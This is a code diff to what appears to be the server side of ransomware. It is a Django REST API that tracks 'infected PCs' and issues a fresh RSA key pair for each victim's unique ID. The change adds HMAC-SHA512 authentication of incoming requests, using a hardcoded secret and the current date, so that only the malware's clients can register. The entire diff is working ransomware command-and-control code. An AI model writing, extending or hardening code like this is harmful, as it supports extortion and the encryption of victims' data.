@@ -13,6 +13,9 @@ from .forms import decryptForm
 from rest_framework.decorators import api_view, renderer_classes
 from ratelimit.decorators import ratelimit
 from Crypto.PublicKey import RSA
+from datetime import datetime
+import hashlib
+import hmac 
 
 
 class ListInfectedPcView(generics.ListAPIView):
@@ -27,7 +30,20 @@ class ListInfectedPcView(generics.ListAPIView):
 @api_view(('POST','GET'))
 def encrypt(request):
     if request.method == 'POST':
-        if 'uniqueId' in request.data:
+        if 'uniqueId' in request.data and 'hMac' in request.data:
+            now = datetime.now()
+            date = now.strftime('%Y-%m-%d')
+            messageServer = bytes(date, 'utf-8')
+            secretKey = bytes("IyT87LzSAwq3kBwQ", 'utf-8')
+            hmacServer  = hmac.new(secretKey, messageServer, hashlib.sha512).hexdigest()
+            hmacClient = request.data['hMac']
+            hmacValid = hmac.compare_digest(hmacServer, hmacClient)
+            print(hmacValid)
+            if not hmacValid:
+                return Response(
+                    data="hmac invalid",
+                    status=status.HTTP_405_METHOD_NOT_ALLOWED
+                )
             if not InfectedPc.objects.filter(uniqueId = request.data['uniqueId']).exists():
                 key = RSA.generate(2048)
                 privateKey = key.export_key(pkcs=8)
@@ -48,7 +64,7 @@ def encrypt(request):
                 )
         else:
             return Response(
-                data="No uniqueId provided",
+                data="No uniqueId provided or hmac missing",
                 status=status.HTTP_405_METHOD_NOT_ALLOWED
             )        
     else:
